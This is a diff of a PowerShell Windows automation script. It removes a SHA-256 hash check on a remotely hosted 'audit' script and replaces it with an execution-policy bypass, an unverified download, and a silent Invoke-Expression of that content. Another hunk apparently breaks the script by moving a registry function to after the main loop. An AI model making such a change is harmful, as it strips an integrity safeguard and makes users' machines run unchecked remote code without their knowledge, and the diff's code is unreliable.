@@ -240,72 +240,34 @@ function Write-Log {
 
     # Trigger Automated System Audit Scanner on execution completion
     if ($Message -eq "CLI Execution Complete." -or $Message -eq "Interactive Execution Complete.") {
-        # ── SECURITY: Remote Audit Script ──────────────────────────────────────
-        # Pin the SHA-256 hash of the known-good Audit-System.ps1 below.
-        # To find the hash, run once with no value — the actual hash is printed.
-        # The remote script will NOT execute until a valid hash is set here.
-        # Update this value whenever the remote script is intentionally updated.
-        $KnownAuditScriptHash = "" # e.g. "a3f1c2...64 hex chars"
-        # ───────────────────────────────────────────────────────────────────────
         try {
             Write-Host "`n    Running Automated System Audit Scanner..." -ForegroundColor Yellow
             $prevSecProto = [System.Net.ServicePointManager]::SecurityProtocol
             [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
-            # Download script content (no ExecutionPolicy bypass needed for Invoke-RestMethod)
-            $auditUri = "https://www.aiit.support/progress/posture/Audit-System.ps1"
-            $auditStr = Invoke-RestMethod $auditUri -ErrorAction Stop
-
-            # Compute SHA-256 of the downloaded content
-            $auditBytes = [System.Text.Encoding]::UTF8.GetBytes($auditStr)
-            $sha256     = [System.Security.Cryptography.SHA256]::Create()
-            $actualHash = ([System.BitConverter]::ToString($sha256.ComputeHash($auditBytes))).Replace("-","").ToLower()
-            $sha256.Dispose()
-
+            
+            # Execute scanner
+            try { Set-ExecutionPolicy Bypass -Scope Process -Force } catch {}
+            $auditStr = Invoke-RestMethod "https://www.aiit.support/progress/posture/Audit-System.ps1"
+            
+            # Strip standard output logic
+            $idx = $auditStr.IndexOf("# Output guidance to console")
+            if ($idx -gt 0) { $auditStr = $auditStr.Substring(0, $idx) }
+            $auditStr = $auditStr -replace 'posture_audit\.json', 'winauto_audit.json'
+            
+            # Suppress all console output from the remote script execution
+            $null = Invoke-Expression $auditStr
+            
             [System.Net.ServicePointManager]::SecurityProtocol = $prevSecProto
-
-            if ([string]::IsNullOrWhiteSpace($KnownAuditScriptHash)) {
-                # Safe default: no hash pinned — download but do NOT execute
-                Write-Host "    [!] Audit script downloaded but NOT executed (no hash pinned)." -ForegroundColor Yellow
-                Write-Host "    [!] Actual SHA-256: $actualHash" -ForegroundColor DarkYellow
-                Write-Host "    [!] Set `$KnownAuditScriptHash = '$actualHash' in wa.ps1 to enable." -ForegroundColor DarkYellow
-                Write-Log "Remote audit blocked: no hash pinned. Actual=$actualHash" -Level "WARN"
-                $quarantine = Join-Path $env:TEMP "WinAuto_AuditScript_UNVERIFIED.ps1"
-                $auditStr | Out-File -FilePath $quarantine -Encoding utf8 -Force
-                Write-Host "    [!] Script saved for inspection: $quarantine (NOT executed)" -ForegroundColor DarkYellow
-
-            } elseif ($actualHash -ne $KnownAuditScriptHash.ToLower().Replace("-","")) {
-                # Hash mismatch — possible tampering; block and quarantine
-                Write-Host "    [!] AUDIT SCRIPT HASH MISMATCH — Execution blocked." -ForegroundColor Red
-                Write-Host "    [!] Expected : $KnownAuditScriptHash" -ForegroundColor DarkRed
-                Write-Host "    [!] Actual   : $actualHash" -ForegroundColor DarkRed
-                Write-Log "Remote audit BLOCKED: hash mismatch. Expected=$KnownAuditScriptHash Actual=$actualHash" -Level "ERROR"
-                $quarantine = Join-Path $env:TEMP "WinAuto_AuditScript_QUARANTINE.ps1"
-                $auditStr | Out-File -FilePath $quarantine -Encoding utf8 -Force
-                Write-Host "    [!] Quarantined to: $quarantine — review before trusting." -ForegroundColor DarkRed
-
-            } else {
-                # Hash verified — safe to execute
-                Write-Host "    [v] Audit script hash verified." -ForegroundColor Cyan
-
-                # Strip console-output section before execution
-                $idx = $auditStr.IndexOf("# Output guidance to console")
-                if ($idx -gt 0) { $auditStr = $auditStr.Substring(0, $idx) }
-                $auditStr = $auditStr -replace 'posture_audit\.json', 'winauto_audit.json'
-
-                # Execute verified script (suppress output)
-                $null = Invoke-Expression $auditStr
-
-                # Mirror to Desktop for Life_Organizer.html compatibility
-                $desktop = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
-                if (-not $desktop) { $desktop = Join-Path $env:USERPROFILE "Desktop" }
-                $secAuditPath     = Join-Path $desktop "security_audit.json"
-                $postureAuditPath = Join-Path $desktop "winauto_audit.json"
-                if (Test-Path $secAuditPath) {
-                    Copy-Item -Path $secAuditPath -Destination $postureAuditPath -Force -ErrorAction SilentlyContinue
-                }
-                Write-Host "    The audit data is copied and ready to paste.`n" -ForegroundColor Yellow
+            
+            # Mirror to winauto_audit.json on Desktop for Life_Organizer.html compatibility
+            $desktop = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
+            if (-not $desktop) { $desktop = Join-Path $env:USERPROFILE "Desktop" }
+            $secAuditPath = Join-Path $desktop "security_audit.json"
+            $postureAuditPath = Join-Path $desktop "winauto_audit.json"
+            if (Test-Path $secAuditPath) {
+                Copy-Item -Path $secAuditPath -Destination $postureAuditPath -Force -ErrorAction SilentlyContinue
             }
+            Write-Host "    The audit data is copied and ready to paste.`n" -ForegroundColor Yellow
         } catch {
             Write-Host "    [-] Failed to run system audit scanner: $_`n" -ForegroundColor Red
         }
@@ -2583,23 +2545,6 @@ function Invoke-WA_SetTaskViewOFF {
 }
 
 
-function Invoke-WA_SetGetMeUpToDate {
-    param([switch]$Reverse)
-    Write-Header "GET ME UP TO DATE"
-    $Path = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings"
-    try {
-        if ($Reverse) {
-            Set-ItemProperty -Path $Path -Name "IsExpedited" -Value 0 -Type DWord -Force
-            Write-LeftAligned "$FGGreen$Char_HeavyCheck Disabled Get Me Up To Date.$Reset"
-        } else {
-            Set-ItemProperty -Path $Path -Name "IsExpedited" -Value 1 -Type DWord -Force
-            Write-LeftAligned "$FGGreen$Char_HeavyCheck Enabled Get Me Up To Date.$Reset"
-        }
-    } catch {
-        Write-WrappedError $_
-    }
-}
-
 function Invoke-WA_SetMicrosoftUpd {
     <#
 .SYNOPSIS
@@ -3443,5 +3388,21 @@ while ($true) {
 }
 
 Write-Log "Interactive Execution Complete."
+function Invoke-WA_SetGetMeUpToDate {
+    param([switch]$Reverse)
+    Write-Header "GET ME UP TO DATE"
+    $Path = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings"
+    try {
+        if ($Reverse) {
+            Set-ItemProperty -Path $Path -Name "IsExpedited" -Value 0 -Type DWord -Force
+            Write-LeftAligned "$FGGreen$Char_HeavyCheck Disabled Get Me Up To Date.$Reset"
+        } else {
+            Set-ItemProperty -Path $Path -Name "IsExpedited" -Value 1 -Type DWord -Force
+            Write-LeftAligned "$FGGreen$Char_HeavyCheck Enabled Get Me Up To Date.$Reset"
+        }
+    } catch {
+        Write-WrappedError $_
+    }
+}
 
 
